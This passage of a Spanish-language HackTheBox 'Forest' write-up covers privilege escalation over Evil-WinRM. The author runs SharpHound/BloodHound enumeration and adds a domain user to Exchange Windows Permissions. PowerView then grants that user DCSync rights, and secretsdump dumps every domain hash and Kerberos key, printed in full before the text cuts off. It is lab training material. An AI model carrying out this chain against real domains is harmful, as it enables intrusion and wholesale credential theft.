+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>No vemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar <strong>Bloodhound</strong> para que nos muestre formas de elevar nuestro privilegio pero para eso primero tenemos que descargar y subir a la maquina el <strong>SharpHound.ps1</strong> <a href="https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1">https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
+<span class="nt">--2023-06-17</span> 18:53:48--  https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.110.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 973325 <span class="o">(</span>951K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «SharpHound.ps1»
+
+SharpHound.ps1                  100%[<span class="o">=======================================================&gt;]</span> 950.51K   715KB/s    en 1.3s    
+
+2023-06-17 18:53:51 <span class="o">(</span>715 KB/s<span class="o">)</span> - «SharpHound.ps1» guardado <span class="o">[</span>973325/973325]
+
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo subimos ala maquina es importante estar en la misma ruta conectados con <code class="language-plaintext highlighter-rouge">evil-winrm</code> para poder subir de manera correcta el archivo si no podemos usar <code class="language-plaintext highlighter-rouge">curl</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; upload SharpHound.ps1
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Forest/content/SharpHound.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments<span class="se">\S</span>harpHound.ps1
+                                        
+Data: 1297764 bytes of 1297764 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a iniciar el <strong>neo4j</strong> para poder usar la herramienta <strong>Bloodhound</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ neo4j start
+Directories <span class="k">in </span>use:
+home:         /var/lib/neo4j
+config:       /etc/neo4j
+logs:         /var/log/neo4j
+plugins:      /var/lib/neo4j/plugins
+import:       /var/lib/neo4j/import
+data:         /var/lib/neo4j/data
+certificates: /var/lib/neo4j/certificates
+licenses:     /var/lib/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+Started neo4j <span class="o">(</span>pid:98162<span class="o">)</span><span class="nb">.</span> It is available at http://localhost:7474
+There may be a short delay <span class="k">until </span>the server is ready.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si vamos a nuestro navegador y nos dirigimos a nuestro <code class="language-plaintext highlighter-rouge">localhost</code> y el puerto veremos la interfaz gráfica de <strong>neo4j</strong> y procederemos a conectarnos con nuestras credenciales en caso de que sea tu primera vez que te conectas a este servicio tienes que crear un usuario nuevo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web2.png" />
+</p>
+
+<ul>
+  <li>Ahora vamos a iniciar el <strong>bloodhound</strong> y nos conectamos con nuestras credenciales de <strong>neo4j</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bloodhound &amp;&gt; /dev/null &amp; <span class="nb">disown</span>
+<span class="o">[</span>1] 105077
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora en la maquina victima vamos a importar el modulo para poder usar las funciones.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>harpHound.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo que vamos a hacer es <strong>BloodHound</strong> e indicarle que queremos recolectar toda la información del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; Invoke-BloodHound <span class="nt">-CollectionMethod</span> All 
+</code></pre></div></div>
+
+<ul>
+  <li>Al terminar nos va a dar un <strong>.zip</strong> que tenemos que transferirlo a nuestra maquina de atacante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        6/17/2023   6:17 PM          15497 20230617181736_BloodHound.zip
+<span class="nt">-a----</span>        6/17/2023   6:17 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+<span class="nt">-a----</span>        6/17/2023   6:02 PM         973325 SharpHound.ps1
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Lo descargamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; download 20230617181736_BloodHound.zip
+                                        
+Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments<span class="se">\2</span>0230617181736_BloodHound.zip to 20230617181736_BloodHound.zip
+                                        
+Info: Download successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora subimos el <strong>.zip</strong> al <strong>BloodHound</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web3.png" />
+</p>
+
+<ul>
+  <li>Podemos poner que el usuario lo tenemos comprometido por así decirle se pondrá el icono de una calavera.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web4.png" />
+</p>
+
+<ul>
+  <li>De primeras pertenecemos a este grupo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web5.png" />
+</p>
+
+<ul>
+  <li>Cuando formamos parte del grupo <strong>Account Operators</strong> podemos crear un nuevo usuario e incorporarlo en grupos del dominio.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web6.png" />
+</p>
+
+<ul>
+  <li>Ahora vamos a elevar privilegios efectuando <code class="language-plaintext highlighter-rouge">DCSync</code> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web7.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/forest/web8.png" />
+</p>
+
+<ul>
+  <li>Vamos a importar el <strong>PowerView</strong> en la maquina victima <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; upload PowerView.ps1
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Forest/content/PowerView.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments<span class="se">\P</span>owerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        6/17/2023   6:17 PM          15497 20230617181736_BloodHound.zip
+<span class="nt">-a----</span>        6/17/2023   6:17 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+<span class="nt">-a----</span>        6/17/2023   7:22 PM         770279 PowerView.ps1
+<span class="nt">-a----</span>        6/17/2023   6:02 PM         973325 SharpHound.ps1
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a crear el usuario a nivel de dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; net user miguel miguel123<span class="nv">$!</span> /add /domain
+The <span class="nb">command </span>completed successfully.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>El usuario se creo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; net user miguel
+User name                    miguel
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/17/2023 7:23:24 PM
+Password expires             Never
+Password changeable          6/18/2023 7:23:24 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos que meter al usuario en el grupo <strong>Exchange Windows Permissions</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; net group <span class="s2">"Exchange Windows Permissions"</span> miguel /add
+The <span class="nb">command </span>completed successfully.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; net user miguel
+User name                    miguel
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/17/2023 7:23:24 PM
+Password expires             Never
+Password changeable          6/18/2023 7:23:24 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a darle el privilegio de <strong>DCSync</strong> al usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'miguel123$!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a definir una credencial  y le indicamos el dominio la contraseña <strong>$SecPassword</strong> ya la tenemos definida.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'htb.local\miguel'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a importar el modulo de <strong>PowerView</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owerView.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Y por ultimo hacemos esto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; Add-DomainObjectAcl <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> miguel <span class="nt">-Rights</span> DCSync
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Y con esto usando <code class="language-plaintext highlighter-rouge">secretsdump</code> podremos dumpear todos los hashes y tendremos el del administrator le vamos a pasar la contraseña que le dimos al usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ secretsdump.py htb.local/miguel@10.10.10.161
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\$</span>331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\S</span>M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local<span class="se">\H</span>ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local<span class="se">\H</span>ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local<span class="se">\H</span>ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local<span class="se">\H</span>ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local<span class="se">\H</span>ealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local<span class="se">\H</span>ealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local<span class="se">\H</span>ealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local<span class="se">\H</span>ealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local<span class="se">\H</span>ealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local<span class="se">\H</span>ealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local<span class="se">\H</span>ealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local<span class="se">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local<span class="se">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local<span class="se">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local<span class="se">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local<span class="se">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local<span class="se">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+miguel:9601:aad3b435b51404eeaad3b435b51404ee:a5d00adb6dfe29ef13ae455a35ddec78:::
+FOREST<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:142956afd03cfb663885c87412feab75:::
+EXCH01<span class="nv">$:</span>1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+htb.local<span class="se">\A</span>dministrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local<span class="se">\A</span>dministrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local<span class="se">\A</span>dministrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local<span class="se">\H</span>ealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local<span class="se">\H</span>ealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local<span class="se">\H</span>ealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local<span class="se">\H</span>ealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local<span class="se">\H</span>ealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local<span class="se">\H</span>ealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local<span class="se">\H</span>ealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local<span class="se">\H</span>ealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local<span class="se">\H</span>ealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local<span class="se">\H</span>ealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local<span class="se">\H</span>ealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local<span class="se">\H</span>ealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local<span class="se">\H</span>ealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local<span class="se">\H</span>ealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local<span class="se">\H</span>ealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local<span class="se">\H</span>ealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local<span class="se">\H</span>ealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local<span class="se">\H</span>ealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local<span class="se">\H</span>ealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local<span class="se">\H</span>ealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local<span class="se">\H</span>ealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local<span class="se">\H</span>ealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local<span class="se">\H</span>ealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local<span class="se">\H</span>ealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local<span class="se">\H</span>ealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local<span class="se">\H</span>ealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local<span class="se">\H</span>ealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local<span class="se">\H</span>ealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local<span class="se">\H</span>ealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local<span class="se">\H</span>ealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local<span class="se">\H</span>ealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local<span class="se">\H</span>ealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local<span class="se">\H</span>ealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local<span class="se">\s</span>ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local<span class="se">\s</span>ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local<span class="se">\s</span>ebastien:des-cbc-md5:702a3445e0d65b58
+htb.local<span class="se">\l</span>ucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local<span class="se">\l</span>ucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local<span class="se">\l</span>ucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local<span class="se">\s</span>vc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local<span class="se">\s</span>vc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local<span class="se">\s</span>vc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local<span class="se">\a</span>ndy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local<span class="se">\a</span>ndy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local<span class="se">\a</span>ndy:des-cbc-md5:a2ab5eef017fb9da
+htb.local<span class="se">\m</span>ark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local<span class="se">\m</span>ark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local<span class="se">\m</span>ark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local<span class="se">\s</span>anti:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local<span class="se">\s</span>anti:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local<span class="se">\s</span>anti:des-cbc-md5:4075ad528ab9e5fd
